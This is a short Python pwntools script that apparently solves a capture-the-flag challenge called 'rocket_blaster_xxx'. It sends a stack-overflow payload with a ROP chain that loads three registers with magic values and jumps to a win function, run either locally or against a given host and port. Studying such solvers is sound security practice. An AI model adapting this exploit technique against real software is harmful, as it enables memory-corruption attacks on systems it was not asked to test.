#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './rocket_blaster_xxx'

LOCAL = True # CHANGE THIS TO True if you want to run it locally

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

banner = r.recvuntil(b"You need to place the ammo in the right place to load the Rocket Blaster XXX!")
print(banner.decode())

payload = b'A'*40
payload += p64(0x40159f) + p64(0xdeadbeef)
payload += p64(0x40159d) + p64(0xdeadbabe)
payload += p64(0x40159b) +  p64(0xdead1337)

payload +=  p64(0x40101a) +  p64(0x4012f5)

print(payload)
print(len(payload))

r.sendlineafter('\n>>',payload)

final_output = b''

while True:
    try:
        chunk = r.recv(timeout=1)
        if not chunk:
            break
        final_output += chunk
    except:
        print("No data!")
        break

print(final_output.decode(errors='ignore'))
